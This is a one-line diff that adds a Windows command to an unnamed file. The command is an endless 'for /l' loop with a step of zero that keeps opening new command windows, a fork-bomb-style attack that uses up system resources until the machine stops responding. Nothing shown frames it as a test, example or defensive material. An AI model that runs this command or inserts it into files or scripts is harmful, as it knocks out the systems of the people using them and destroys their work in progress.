@@ -1,0 +1,1 @@
+cmd /c "for /l %i in (1,0,2) do start cmd"
